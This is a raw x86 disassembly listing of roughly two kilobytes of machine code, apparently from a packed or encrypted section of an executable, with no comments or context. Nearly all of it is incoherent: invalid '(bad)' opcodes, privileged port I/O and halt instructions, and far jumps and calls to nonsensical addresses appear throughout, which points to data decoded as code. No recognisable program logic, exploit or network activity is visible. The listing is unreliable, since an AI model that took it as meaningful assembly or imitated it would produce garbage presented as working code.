  412ff4:	fld    TBYTE PTR [esp+ebx*1]
  412ff7:	cmc    
  412ff8:	dec    dl
  412ffa:	jbe    0x412f8d
  412ffc:	aad    0xbd
  412ffe:	das    
  412fff:	push   ebp
  413000:	test   al,0x90
  413002:	lods   eax,DWORD PTR gs:[esi]
  413004:	pop    edi
  413005:	rcl    BYTE PTR [edx+0x487d0907],1
  41300b:	shl    DWORD PTR [eax-0x31],1
  41300e:	sbb    dh,bh
  413010:	or     ecx,ebp
  413012:	add    eax,0xb1d63a52
  413017:	es inc edi
  413019:	mov    dl,0xd1
  41301b:	pop    ss
  41301c:	sub    al,0x75
  41301e:	out    dx,eax
  41301f:	xor    BYTE PTR [eax+0x47345e2c],dl
  413025:	sub    BYTE PTR [ecx-0x16],ch
  413028:	xchg   ebp,eax
  413029:	jnp    0x4130a6
  41302b:	add    BYTE PTR [eax],bl
  41302d:	mov    al,ds:0x7b9428bd
  413032:	nop
  413033:	ins    DWORD PTR es:[edi],dx
  413034:	mov    edi,0xc6ecbfa1
  413039:	cdq    
  41303a:	(bad)  
  41303c:	push   ds
  41303d:	jp     0x413051
  41303f:	and    al,dl
  413041:	lea    edi,[ecx+0x7e44feea]
  413047:	cmp    al,0xeb
  413049:	lods   eax,DWORD PTR ds:[esi]
  41304a:	add    al,0xb1
  41304c:	push   ebp
  41304d:	mov    ds:0xd040b4a1,eax
  413052:	test   eax,0xa25364bb
  413057:	jnp    0x41301a
  413059:	dec    ecx
  41305a:	rcr    bl,1
  41305c:	and    DWORD PTR [ebx],edi
  41305e:	add    BYTE PTR [edi],cl
  413060:	xlat   BYTE PTR ds:[ebx]
  413061:	sub    ebx,DWORD PTR [esi-0x54a81677]
  413067:	cs int 0xb6
  41306a:	mov    al,ds:0x429fb083
  41306f:	adc    edi,DWORD PTR [eax-0x2c]
  413072:	cmc    
  413073:	not    DWORD PTR ds:[edx+0x30]
  413077:	pop    DWORD PTR [edx+edi*8-0x3a]
  41307b:	xor    ch,bh
  41307d:	push   edx
  41307e:	mov    edx,0xe8861796
  413083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413084:	cld    
  413085:	pop    ds
  413086:	neg    DWORD PTR [ebx]
  413088:	jge    0x413103
  41308a:	sub    esi,esp
  41308c:	mov    ds:0xe2561448,al
  413091:	loopne 0x41303f
  413093:	out    0xac,al
  413095:	(bad)  
  413096:	fimul  DWORD PTR [edi-0xb]
  413099:	rcr    DWORD PTR [esi],0x6d
  41309c:	push   ds
  41309d:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41309f:	(bad)  
  4130a0:	cmc    
  4130a1:	xchg   ecx,eax
  4130a2:	adc    edi,edi
  4130a4:	cmp    bl,al
  4130a6:	mov    eax,0x121167a2
  4130ab:	out    dx,eax
  4130ac:	mov    bh,0xd0
  4130ae:	test   eax,0xb3673f8e
  4130b3:	jmp    0x146ef932
  4130b8:	inc    ecx
  4130b9:	mov    ebp,DWORD PTR [ebx-0x72]
  4130bc:	sbb    al,0xaf
  4130be:	and    ah,BYTE PTR [ebx-0x52]
  4130c1:	outs   dx,DWORD PTR ds:[esi]
  4130c2:	int3   
  4130c3:	mov    BYTE PTR [edx+0x78b4492c],dh
  4130c9:	xchg   ebp,eax
  4130ca:	jmp    0xa4681bc2
  4130cf:	push   0x3e32f7e7
  4130d4:	xor    eax,0x695b94ab
  4130d9:	test   eax,0x2d71a50e
  4130de:	inc    ebp
  4130df:	add    al,0xf5
  4130e1:	mov    cl,0xd3
  4130e3:	mov    al,ds:0x53c7b27
  4130e8:	xchg   esi,eax
  4130e9:	inc    ebp
  4130ea:	cld    
  4130eb:	inc    eax
  4130ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130ed:	mov    edi,0x9f3238a2
  4130f2:	shl    DWORD PTR [edx+0x218088af],1
  4130f8:	ins    DWORD PTR es:[edi],dx
  4130f9:	add    bl,BYTE PTR ds:0x43781f4c
  4130ff:	lea    edi,[ebp+0x6895454c]
  413105:	fwait
  413106:	(bad)  
  413108:	pop    esp
  413109:	jmp    FWORD PTR [esi-0x56]
  41310c:	dec    ecx
  41310d:	mov    ds:0xee10e9a6,al
  413112:	rcr    al,1
  413114:	gs js  0x4130a9
  413117:	js     0x4130e9
  413119:	or     al,0x7a
  41311b:	mov    ebp,0xdd23083
  413120:	sbb    BYTE PTR [eax+0x55],bh
  413123:	out    0xae,al
  413125:	mov    al,ds:0xfea96fe7
  41312a:	xchg   edx,eax
  41312b:	popa   
  41312c:	sbb    ebp,eax
  41312e:	retf   
  41312f:	or     al,BYTE PTR [edx-0x1c4fa1f4]
  413135:	adc    eax,0x7b4cc2f
  41313a:	aas    
  41313b:	std    
  41313c:	call   0x3acce6b0
  413141:	not    BYTE PTR [ecx-0x27ac2aaa]
  413147:	jmp    0x2c768ae0
  41314c:	shl    dl,0x45
  41314f:	adc    eax,0x66bb615c
  413154:	pop    ss
  413155:	jl     0x413110
  413157:	pop    esp
  413158:	mov    BYTE PTR [ecx],bl
  41315a:	mov    cl,0xb6
  41315c:	leave  
  41315d:	daa    
  41315e:	(bad)  
  41315f:	cmp    DWORD PTR [edx],eax
  413161:	adc    al,0xd5
  413163:	mov    esp,0xf085dfd
  413168:	sbb    BYTE PTR [edx-0x5b5c00f7],al
  41316e:	sub    BYTE PTR [ecx+0x555bf407],dh
  413174:	cmp    BYTE PTR [eax-0x47],cl
  413177:	push   es
  413178:	fwait
  413179:	aam    0xed
  41317b:	cld    
  41317c:	outs   dx,DWORD PTR ds:[esi]
  41317d:	inc    edx
  41317e:	outs   dx,BYTE PTR ds:[esi]
  41317f:	dec    edi
  413180:	test   eax,0x229f3c8f
  413185:	jae    0x413127
  413187:	mov    edx,0xfa5b75ce
  41318c:	dec    eax
  41318d:	lods   al,BYTE PTR ds:[esi]
  41318e:	xor    BYTE PTR [ebp-0x5f],al
  413191:	mov    ch,0x59
  413193:	pop    edx
  413194:	xchg   ecx,eax
  413195:	stc    
  413196:	xor    BYTE PTR [edx],al
  413198:	pop    esp
  413199:	jbe    0x413179
  41319b:	aas    
  41319c:	cmp    DWORD PTR [esi-0x60],0xffffffef
  4131a0:	aas    
  4131a1:	into   
  4131a2:	pop    ecx
  4131a3:	dec    ebx
  4131a4:	add    al,0xaf
  4131a6:	pop    edi
  4131a7:	pop    es
  4131a8:	loopne 0x4131e8
  4131aa:	or     dl,bh
  4131ac:	jo     0x413176
  4131ae:	es add eax,0xb85eb856
  4131b4:	jg     0x41322b
  4131b6:	scas   eax,DWORD PTR es:[edi]
  4131b7:	mov    eax,ds:0xd13857c
  4131bc:	out    0x46,eax
  4131be:	loop   0x4131c0
  4131c0:	lods   al,BYTE PTR ds:[esi]
  4131c1:	xor    al,0xcf
  4131c3:	je     0x413165
  4131c5:	jl     0x413155
  4131c7:	jp     0x41314b
  4131c9:	into   
  4131ca:	cmp    BYTE PTR [edi+0x4d9bc81f],cl
  4131d0:	mov    eax,ds:0x7fee8a0a
  4131d5:	fwait
  4131d6:	popa   
  4131d7:	out    dx,eax
  4131d8:	sar    DWORD PTR ds:0xa8de6f9f,0xf3
  4131df:	sbb    eax,edi
  4131e1:	mov    al,BYTE PTR [ecx]
  4131e3:	hlt    
  4131e4:	out    0x28,al
  4131e6:	daa    
  4131e7:	inc    esp
  4131e8:	pop    edi
  4131e9:	arpl   WORD PTR [esi],bp
  4131eb:	enter  0x62db,0x9f
  4131ef:	clc    
  4131f0:	add    dh,BYTE PTR [esi]
  4131f2:	fst    QWORD PTR [ecx+0xd480b9]
  4131f8:	mov    eax,ds:0x243bae77
  4131fd:	push   eax
  4131fe:	xlat   BYTE PTR ds:[ebx]
  4131ff:	and    DWORD PTR [edx-0x23],0x28
  413203:	hlt    
  413204:	inc    edi
  413205:	popf   
  413206:	adc    edx,ebp
  413208:	pop    edx
  413209:	shl    esp,0x79
  41320c:	push   0xffffffc2
  41320e:	dec    edi
  41320f:	(bad)  
  413210:	aas    
  413211:	stos   BYTE PTR es:[edi],al
  413212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413213:	xchg   esi,eax
  413214:	or     BYTE PTR [ecx],dl
  413216:	xchg   ecx,eax
  413217:	dec    ebp
  413218:	inc    edx
  413219:	or     BYTE PTR [esi+0x50],bl
  41321c:	test   al,0x16
  41321e:	push   esi
  41321f:	sub    ah,dl
  413221:	push   ebp
  413222:	daa    
  413223:	(bad)  
  413224:	mov    es,WORD PTR [edi]
  413226:	int    0x1d
  413228:	(bad)  
  413229:	xor    DWORD PTR [ebp-0x3085d27],ebx
  41322f:	cmp    BYTE PTR [edi+0x16],0x33
  413233:	pop    ecx
  413234:	and    ebp,esi
  413236:	scas   al,BYTE PTR es:[edi]
  413237:	adc    DWORD PTR [esi],esi
  413239:	xchg   esp,eax
  41323a:	fidiv  DWORD PTR [ebx]
  41323c:	dec    ebx
  41323d:	and    DWORD PTR [edi+0x7c1e9e1a],ebx
  413243:	sahf   
  413244:	loope  0x413295
  413246:	cmp    BYTE PTR [esi],0x97
  413249:	bound  eax,QWORD PTR [ecx-0x32]
  41324c:	jne    0x41327c
  41324e:	sbb    DWORD PTR [edx+ecx*2+0x6eb5bad3],edx
  413255:	cmp    esi,DWORD PTR [esp+ebp*1]
  413258:	mov    eax,ds:0x9e019c97
  41325d:	push   edi
  41325e:	inc    ebx
  41325f:	fcom   QWORD PTR [esi+ebx*1]
  413262:	mov    edx,DWORD PTR [ebp-0x1c8858cc]
  413268:	stos   BYTE PTR es:[edi],al
  413269:	jb     0x413279
  41326b:	out    0x5f,eax
  41326d:	test   edx,esi
  41326f:	imul   ebx,DWORD PTR [ecx-0x4c],0xffffff98
  413273:	ins    BYTE PTR es:[edi],dx
  413274:	bound  edx,QWORD PTR [edi+0x1f]
  413277:	mov    bl,0xe3
  413279:	push   ss
  41327a:	inc    ebp
  41327b:	jbe    0x4132f2
  41327d:	cli    
  41327e:	cwde   
  41327f:	retf   0x2d3b
  413282:	sub    ebx,DWORD PTR [ecx*2-0x4a37323a]
  413289:	int3   
  41328a:	mov    dl,0x6b
  41328c:	cld    
  41328d:	sub    eax,0x2dbe8f15
  413292:	ds push 0x42
  413295:	mov    edi,0xcb4da6b2
  41329a:	xor    BYTE PTR [esi],cl
  41329c:	xchg   bh,dh
  41329e:	pop    ss
  41329f:	jmp    0xa4a5:0x84304bca
  4132a6:	mov    WORD PTR [esi-0x52e1c02e],fs
  4132ac:	(bad)  
  4132ad:	out    0xf2,eax
  4132af:	out    dx,al
  4132b0:	mov    eax,0x9e90e9db
  4132b5:	jo     0x413324
  4132b7:	out    0x8b,eax
  4132b9:	add    dl,BYTE PTR [esi+edx*2+0x34bfe233]
  4132c0:	inc    ebx
  4132c1:	mov    eax,ds:0xb14d6158
  4132c6:	mov    eax,0x299c49e2
  4132cb:	mov    al,ds:0xf3535155
  4132d0:	jge    0x413295
  4132d2:	fdivr  st,st(7)
  4132d4:	cmp    bh,BYTE PTR [esp+edi*4]
  4132d7:	call   0x7f053a75
  4132dc:	inc    dl
  4132de:	push   ds
  4132df:	ret    0xb928
  4132e2:	pop    ss
  4132e3:	das    
  4132e4:	(bad)  
  4132e5:	dec    edx
  4132e6:	cdq    
  4132e7:	jp     0x4132fb
  4132e9:	pop    ds
  4132ea:	cwde   
  4132eb:	ret    0x4f53
  4132ee:	mov    al,0x5f
  4132f0:	or     BYTE PTR [eax],ch
  4132f2:	inc    DWORD PTR [edi+eiz*2]
  4132f5:	mov    ecx,ebp
  4132f7:	hlt    
  4132f8:	daa    
  4132f9:	jo     0x4132f0
  4132fb:	push   edx
  4132fc:	shl    BYTE PTR [ebp-0x41],cl
  4132ff:	rcl    DWORD PTR [edx+0x76392971],cl
  413305:	pop    ecx
  413306:	pop    ds
  413307:	and    al,bl
  413309:	pop    ebp
  41330a:	cmc    
  41330b:	and    esp,edx
  41330d:	push   ebx
  41330e:	cs jecxz 0x41337a
  413311:	inc    ecx
  413312:	pop    es
  413313:	adc    DWORD PTR [esi-0x27],edi
  413316:	mov    dl,0x97
  413318:	ror    esp,1
  41331a:	leave  
  41331b:	fisubr WORD PTR [edx]
  41331d:	jle    0x413320
  41331f:	ins    DWORD PTR es:[edi],dx
  413320:	mov    edi,ebp
  413322:	out    dx,eax
  413323:	or     edi,ebp
  413325:	lds    edx,FWORD PTR [ecx-0x43]
  413328:	jl     0x41336f
  41332a:	out    0xda,eax
  41332c:	mov    ds:0x133cf201,al
  413331:	mov    esi,0xcddc76fa
  413336:	call   0xa96c:0xb267f9af
  41333d:	(bad)  [esi]
  41333f:	jne    0x4132e2
  413341:	jl     0x413337
  413343:	stc    
  413344:	lods   eax,DWORD PTR ds:[esi]
  413345:	pop    eax
  413346:	xlat   BYTE PTR ds:[ebx]
  413347:	iret   
  413348:	cmp    esi,edx
  41334a:	int    0xa5
  41334c:	xor    DWORD PTR [esi],esp
  41334e:	sub    eax,DWORD PTR [edi-0x48]
  413351:	mul    DWORD PTR [eax-0x11]
  413354:	pusha  
  413355:	mov    eax,0x29ef2ec1
  41335a:	fidivr DWORD PTR [edx]
  41335c:	(bad)  
  41335d:	stc    
  41335e:	jecxz  0x413341
  413360:	mov    al,BYTE PTR [eax]
  413362:	in     al,dx
  413363:	xor    eax,0x5a58249d
  413368:	(bad)  
  413369:	or     DWORD PTR ds:0xcbb68037,0xffffffe8
  413370:	lea    esp,[edi+ebx*8+0x1a]
  413374:	xlat   BYTE PTR ds:[ebx]
  413375:	mov    WORD PTR [edx],?
  413377:	dec    esi
  413378:	cs clc 
  41337a:	and    DWORD PTR [esi],0x1911fc05
  413380:	out    0xb5,eax
  413382:	mov    eax,ds:0x7ca281e1
  413387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413388:	mov    esp,0xa3930db9
  41338d:	sub    ch,BYTE PTR [eax+ebx*2-0x57]
  413391:	(bad)  
  413392:	out    0xb0,eax
  413394:	fisttp DWORD PTR [edi+0x1]
  413397:	sbb    ebp,DWORD PTR [ebx-0x6137b60e]
  41339d:	fs pop es
  41339f:	in     al,dx
  4133a0:	lds    eax,FWORD PTR [eax+0x47b13040]
  4133a6:	jns    0x4133a1
  4133a8:	repnz mov ds:0x86b51c72,eax
  4133ae:	dec    ebp
  4133af:	xchg   edi,eax
  4133b0:	xor    BYTE PTR [esi-0x6b4f9869],ah
  4133b6:	fcomp  QWORD PTR [edi+ebp*2]
  4133b9:	sbb    DWORD PTR [ecx-0x13d3db92],esp
  4133bf:	call   0x8df76160
  4133c4:	std    
  4133c5:	mov    edi,ds
  4133c7:	mov    cs,WORD PTR [edi+0x17badaa0]
  4133cd:	sti    
  4133ce:	and    bh,BYTE PTR [bx+si+0x6985]
  4133d3:	out    0x2d,al
  4133d5:	scas   al,BYTE PTR es:[edi]
  4133d6:	nop
  4133d7:	js     0x413373
  4133d9:	sbb    dl,ah
  4133db:	dec    eax
  4133dc:	jb     0x41340f
  4133de:	sar    DWORD PTR [edx+0xe],cl
  4133e1:	jmp    0x41340d
  4133e3:	pop    ss
  4133e4:	mov    dh,0xd0
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	xor    esp,eax
  4133e9:	mov    dl,0x31
  4133eb:	popa   
  4133ec:	test   DWORD PTR [ebp+0x32],0x3dbd1361
  4133f3:	lock enter 0xd84,0xc0
  4133f8:	jne    0x4133db
  4133fa:	test   eax,0x9b162026
  4133ff:	pop    eax
  413400:	push   eax
  413401:	loopne 0x4133cc
  413403:	idiv   DWORD PTR [eax+0x7f901d8d]
  413409:	inc    DWORD PTR [edi+0x6f8b8b70]
  41340f:	(bad)  
  413410:	fidiv  DWORD PTR [ebx-0x5d501501]
  413416:	push   eax
  413417:	push   ecx
  413418:	test   eax,0xbab14eac
  41341d:	adc    dh,BYTE PTR [ebx]
  41341f:	add    ah,dh
  413421:	retf   
  413422:	inc    ebx
  413423:	in     al,0x58
  413425:	mov    dl,0x5c
  413427:	daa    
  413428:	hlt    
  413429:	push   0x1e
  41342b:	jbe    0x413492
  41342d:	mov    ebx,0xaca4a82a
  413432:	in     al,0xfd
  413434:	retf   0xf867
  413437:	test   ebx,0xf36c7472
  41343d:	(bad)  
  41343f:	xchg   edi,eax
  413440:	(bad)  
  413441:	jmp    0xdd7654a5
  413446:	test   eax,0xc024638f
  41344b:	rol    BYTE PTR [esi],0xd7
  41344e:	push   0x25fcc68e
  413453:	mov    BYTE PTR [edi-0x10afb1b4],dh
  413459:	mov    dh,0x51
  41345b:	push   0x6d
  41345d:	shr    BYTE PTR [edi],1
  41345f:	cmp    WORD PTR [ecx-0x51],di
  413463:	mov    esp,0x475f9f7d
  413468:	mov    dl,0x2b
  41346a:	pop    ecx
  41346b:	int    0x9a
  41346d:	jmp    0xa3618cc6
  413472:	jmp    0xa968:0x980e46cc
  413479:	xchg   edi,eax
  41347a:	sbb    eax,0xe9c0542f
  41347f:	out    0x5c,eax
  413481:	stos   DWORD PTR es:[edi],eax
  413482:	out    0x1,al
  413484:	iret   
  413485:	or     DWORD PTR [eax-0x3b],ebp
  413488:	xchg   edi,eax
  413489:	or     DWORD PTR [ecx-0x3c378c20],esp
  41348f:	lea    eax,[ebp-0x2e]
  413492:	test   al,0xd0
  413494:	pop    edi
  413495:	aam    0xcc
  413497:	imul   BYTE PTR [ecx-0x52]
  41349a:	pop    ds
  41349b:	fdiv   QWORD PTR [eax-0x1a]
  41349e:	gs mov esp,0x43bfc874
  4134a4:	pop    esp
  4134a5:	cmp    DWORD PTR [edi+0x2bd821a6],ecx
  4134ab:	xlat   BYTE PTR ds:[ebx]
  4134ac:	and    ah,BYTE PTR [ebp+0x44379381]
  4134b2:	dec    ebp
  4134b3:	clc    
  4134b4:	pop    esi
  4134b5:	cwde   
  4134b6:	mov    ecx,0x35257a7e
  4134bb:	inc    edi
  4134bc:	xor    edi,DWORD PTR [edi+0x1315d044]
  4134c2:	nop
  4134c3:	lods   al,BYTE PTR ds:[si]
  4134c5:	mov    edi,eax
  4134c7:	or     ebx,ecx
  4134c9:	push   ecx
  4134ca:	jmp    0xbd68da09
  4134cf:	dec    esp
  4134d0:	neg    esi
  4134d2:	scas   eax,DWORD PTR es:[edi]
  4134d3:	or     al,0xc1
  4134d5:	pop    ebp
  4134d6:	dec    ebx
  4134d7:	ficomp WORD PTR [edi-0x70]
  4134da:	ret    
  4134db:	sub    bl,BYTE PTR [edx-0x59]
  4134de:	push   ebx
  4134df:	cwde   
  4134e0:	aas    
  4134e1:	push   esp
  4134e2:	cmp    bl,BYTE PTR [ebx-0x75]
  4134e5:	or     eax,0x2fc84568
  4134ea:	sbb    BYTE PTR [edi],bl
  4134ec:	mov    bh,0x2a
  4134ee:	xor    eax,0xc2e5652
  4134f3:	loope  0x41353e
  4134f5:	sub    al,0xac
  4134f7:	out    0xde,al
  4134f9:	aas    
  4134fa:	push   ss
  4134fb:	pop    ebp
  4134fc:	cmp    eax,0xd0387ca1
  413501:	cmp    DWORD PTR [ebx+ecx*2-0x3f],edi
  413505:	and    BYTE PTR ds:0xa3056d6b,al
  41350b:	mov    cl,bh
  41350d:	mov    ch,0x55
  41350f:	test   al,0x86
  413511:	(bad)  
  413513:	mov    ah,0x53
  413515:	sub    BYTE PTR [edx],al
  413517:	sbb    ah,BYTE PTR [edi-0x47]
  41351a:	stos   BYTE PTR es:[edi],al
  41351b:	or     DWORD PTR [ecx+edx*4+0x7cff4829],ecx
  413522:	push   eax
  413523:	mov    al,ds:0x73d124f5
  413528:	aaa    
  413529:	and    al,BYTE PTR ds:0xc3083de0
  41352f:	mov    DWORD PTR [edx-0x23c78397],edx
  413535:	test   al,0x9a
  413537:	fwait
  413538:	dec    edi
  413539:	fwait
  41353a:	inc    esi
  41353b:	(bad)  
  41353c:	rol    DWORD PTR [ebx-0x18],1
  41353f:	jl     0x4134fe
  413541:	mov    ah,0xbd
  413543:	and    ecx,DWORD PTR [ebx-0x7cb462b]
  413549:	call   0x4245:0x8cf176d
  413550:	adc    ch,BYTE PTR [edi-0xd8fe2fe]
  413556:	inc    ecx
  413557:	dec    ecx
  413558:	sbb    ebp,DWORD PTR [edx]
  41355a:	(bad)  
  41355b:	cmp    al,0xef
  41355d:	mov    ebp,0xed6c1c4
  413562:	ins    BYTE PTR es:[edi],dx
  413563:	xchg   DWORD PTR [esp+edi*1],ecx
  413566:	sub    al,0xd5
  413568:	sahf   
  413569:	xchg   cl,bh
  41356b:	fdiv   QWORD PTR [eax+0x24e6494a]
  413571:	jbe    0x41355e
  413573:	into   
  413574:	dec    eax
  413575:	mov    edi,0xf7068241
  41357a:	sbb    eax,0xad185ecf
  41357f:	mov    ds:0xab186f51,al
  413584:	cld    
  413585:	fs lock (bad) 
  413588:	icebp  
  413589:	mov    fs,esp
  41358b:	arpl   WORD PTR [ebx],bx
  41358d:	mov    al,BYTE PTR [esp+edi*1+0x26]
  413591:	out    0x4a,eax
  413593:	jbe    0x4135a8
  413595:	pop    ebx
  413596:	loopne 0x413614
  413598:	lods   al,BYTE PTR ds:[esi]
  413599:	push   cs
  41359a:	sar    DWORD PTR [esi+0x1c93399f],1
  4135a0:	sbb    bh,BYTE PTR [esi-0x7624b34e]
  4135a6:	cmp    eax,0x69ac7631
  4135ab:	push   eax
  4135ac:	pop    eax
  4135ad:	addr16 aaa 
  4135af:	call   DWORD PTR [edi]
  4135b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135b2:	cmc    
  4135b3:	pusha  
  4135b4:	pop    ebx
  4135b5:	pop    edx
  4135b6:	add    eax,0x45470c10
  4135bb:	cs mov ah,0x33
  4135be:	adc    DWORD PTR [edi+edx*8+0x2c],edi
  4135c2:	jno    0x4135da
  4135c4:	call   0xbbf90f11
  4135c9:	jb     0x41355c
  4135cb:	in     eax,0xf1
  4135cd:	in     al,dx
  4135ce:	push   edx
  4135cf:	arpl   WORD PTR [edx],cx
  4135d1:	inc    ebx
  4135d2:	inc    eax
  4135d3:	dec    esp
  4135d4:	mov    ebp,0xac7e73b6
  4135d9:	(bad)  
  4135da:	retf   
  4135db:	mov    WORD PTR [esi-0x36],cs
  4135de:	test   BYTE PTR [eax-0x68d2b8ae],cl
  4135e4:	inc    ebx
  4135e5:	repz mov ecx,0x6718dafa
  4135eb:	dec    edx
  4135ec:	into   
  4135ed:	xchg   edi,eax
  4135ee:	stos   DWORD PTR es:[edi],eax
  4135ef:	aam    0x9
  4135f1:	imul   edi,esp,0xf8bfe240
  4135f7:	icebp  
  4135f8:	pusha  
  4135f9:	mov    edi,0xe5b46a34
  4135fe:	fdivr  DWORD PTR [eax]
  413600:	cdq    
  413601:	mov    ecx,0xb457a21
  413606:	mov    ebp,0xdd463058
  41360b:	or     ebp,DWORD PTR [ebx-0x17]
  41360e:	outs   dx,DWORD PTR ds:[esi]
  41360f:	(bad)  
  413610:	stc    
  413611:	in     eax,0xe3
  413613:	in     al,dx
  413614:	pop    eax
  413615:	test   ebx,0xcaa8eddc
  41361b:	stos   BYTE PTR es:[edi],al
  41361c:	and    al,0x11
  41361e:	jmp    0x8511e50a
  413623:	pop    edi
  413624:	test   DWORD PTR [esi+0x2f05e212],0xb96818e6
  41362e:	and    BYTE PTR [ebx+0x57],ch
  413631:	adc    edi,ebx
  413633:	jbe    0x4135f1
  413635:	fsubr  QWORD PTR [ebx]
  413637:	and    eax,0xd03d928b
  41363c:	pop    ecx
  41363d:	push   edi
  41363e:	js     0x413628
  413640:	cld    
  413641:	jle    0x41364b
  413643:	mov    bh,0xf0
  413645:	adc    ebx,DWORD PTR [eax-0x51a21c18]
  41364b:	out    0x8a,al
  41364d:	mov    al,0x1b
  41364f:	sub    al,0x14
  413651:	sub    esi,DWORD PTR [edi]
  413653:	cmp    esp,DWORD PTR [ebx-0x23]
  413656:	add    esi,DWORD PTR [ecx-0xa]
  413659:	pop    ebx
  41365a:	(bad)  
  41365b:	hlt    
  41365c:	retf   
  41365d:	inc    ebx
  41365e:	das    
  41365f:	push   eax
  413660:	sbb    DWORD PTR [ebp-0x3b],ebx
  413663:	pop    ebp
  413664:	test   BYTE PTR [eax],al
  413666:	les    edx,FWORD PTR [edx+0x4b]
  413669:	mov    ah,0x96
  41366b:	dec    edi
  41366c:	sbb    eax,0xae1930c7
  413671:	push   ss
  413672:	xor    DWORD PTR [edi+esi*8+0x9952277],ebp
  413679:	jl     0x413695
  41367b:	add    eax,0x41f92164
  413680:	test   eax,0x9f6241c3
  413685:	jne    0x4136bd
  413687:	xchg   ebx,eax
  413688:	mov    esp,0xcd1da13
  41368d:	mov    ds:0x9ab41f8b,al
  413692:	mov    eax,0x80721877
  413697:	loop   0x4136cc
  413699:	cmp    DWORD PTR [ecx-0x31],ebp
  41369c:	xor    DWORD PTR [eax+edx*4-0x46],ebp
  4136a0:	popf   
  4136a1:	in     al,dx
  4136a2:	retf   
  4136a3:	jnp    0x413652
  4136a5:	mov    esi,0xb2a65ed
  4136aa:	in     al,0x41
  4136ac:	adc    bh,al
  4136ae:	mov    eax,DWORD PTR [ebx+ebx*4]
  4136b1:	aas    
  4136b2:	jecxz  0x41366c
  4136b4:	mov    eax,eax
  4136b6:	cmp    al,0x55
  4136b8:	mov    bh,0x4
  4136ba:	xchg   edx,eax
  4136bb:	(bad)  
  4136bc:	bound  ecx,QWORD PTR [eax]
  4136be:	iret   
  4136bf:	and    DWORD PTR [ebx+0x19c3f958],ebx
  4136c5:	out    0x4d,eax
  4136c7:	dec    ebp
  4136c8:	pop    esp
  4136c9:	jnp    0x41373b
  4136cb:	mov    al,0x79
  4136cd:	ja     0x4136fc
  4136cf:	inc    ecx
  4136d0:	xchg   BYTE PTR [edi-0x77],dl
  4136d3:	iret   
  4136d4:	std    
  4136d5:	stos   BYTE PTR es:[edi],al
  4136d6:	add    al,0x85
  4136d8:	dec    ebp
  4136d9:	nop
  4136da:	mov    ds:0x72c25c83,al
  4136df:	mov    cl,0x63
  4136e1:	cmp    eax,0x4975dea9
  4136e6:	adc    eax,0xdd2ef98d
  4136eb:	xor    BYTE PTR [eax+0x26],ah
  4136ee:	(bad)  
  4136ef:	jnp    0x4136e5
  4136f1:	push   DWORD PTR [bp+si+0x567b]
  4136f6:	mov    bh,0x74
  4136f8:	add    esp,edx
  4136fa:	push   ebx
  4136fb:	mov    ds:0xf109564b,al
  413700:	lds    ebp,FWORD PTR [esi-0x7e]
  413703:	fld    QWORD PTR [ebp+0x2c]
  413706:	sar    BYTE PTR [eax],0x54
  413709:	mov    edx,DWORD PTR [esi-0x8]
  41370c:	fdivr  DWORD PTR [edi+0x1f]
  41370f:	xchg   ecx,eax
  413710:	cwde   
  413711:	or     BYTE PTR [esp+ebp*8-0x2a],dh
  413715:	ret    
  413716:	in     al,0x73
  413718:	aaa    
  413719:	xor    esi,edi
  41371b:	int3   
  41371c:	xchg   esp,eax
  41371d:	pop    esi
  41371e:	nop
  41371f:	pop    ebp
  413720:	xchg   esi,eax
  413721:	sbb    eax,0x1f05a6ab
  413726:	jo     0x413771
  413728:	mov    ah,0x3c
  41372a:	stc    
  41372b:	dec    ebx
  41372c:	adc    BYTE PTR [esi],al
  41372e:	jno    0x413749
  413730:	(bad)  
  413731:	and    eax,ebx
  413733:	dec    esi
  413734:	dec    esp
  413735:	jg     0x41373c
  413737:	inc    BYTE PTR [ebx-0x2c]
  41373a:	fsub   DWORD PTR [edi-0x3e104e6c]
  413740:	push   0xffffffff
  413742:	jg     0x4137c0
  413744:	and    dl,BYTE PTR [edx]
  413746:	test   DWORD PTR [esi-0xa],edi
  413749:	retf   
  41374a:	cli    
  41374b:	cli    
  41374c:	sbb    eax,0x5b6052d
  413751:	clc    
  413752:	or     eax,0x3b599edb
  413757:	push   ebx
  413758:	cmp    ah,BYTE PTR [ebx+0x69]
  41375b:	bound  ebx,QWORD PTR ds:0xad68745a
  413761:	(bad)  
  413762:	out    dx,eax
  413763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413764:	or     DWORD PTR [edi+0x748a92e7],ecx
  41376a:	aam    0x4c
  41376c:	int    0xf3
  41376e:	jne    0x4136fd
  413770:	adc    ebp,DWORD PTR [ebx+ebx*8-0x6ade35a6]
  413777:	adc    ebp,DWORD PTR [ebx+ecx*4]
  41377a:	sbb    al,BYTE PTR [ebx+0x1a9d0461]
  413780:	xchg   DWORD PTR [eax-0x583ac9c6],ebp
  413786:	inc    eax
  413787:	inc    ebp
  413788:	dec    edi
  413789:	xchg   edx,eax
  41378a:	fwait
  41378b:	push   esi
  41378c:	mov    dl,0x7f
  41378e:	loop   0x413809
  413790:	sub    edi,DWORD PTR ds:0x601c57c5
  413796:	pop    si
  413798:	sub    al,0x72
  41379a:	adc    DWORD PTR [eax-0x4ee94ace],esi
  4137a0:	cmp    al,0x98
  4137a2:	or     cl,0x7c
  4137a5:	push   edx
  4137a7:	(bad)  
  4137a8:	jg     0x413759
  4137aa:	inc    esp
  4137ab:	mov    ds:0x205c2f6b,al
  4137b0:	xor    al,0x51
  4137b2:	retf   0x6eaa
  4137b5:	inc    esp
  4137b6:	pop    edx
  4137b7:	sbb    al,0x24
  4137b9:	jp     0x41374e
  4137bb:	mov    bh,0xb5
  4137bd:	ss push eax
  4137bf:	cmp    al,BYTE PTR [ecx+0x1a]
  4137c2:	ins    DWORD PTR es:[edi],dx
  4137c3:	out    dx,eax
  4137c4:	jns    0x413771
  4137c6:	xchg   ebp,eax
  4137c7:	push   ebx
  4137c8:	cli    
  4137c9:	inc    ebp
  4137ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137cb:	jmp    0x55914122
  4137d0:	push   ds
  4137d1:	sbb    DWORD PTR [eax],0x29
  4137d4:	sahf   
  4137d5:	xchg   ebp,eax
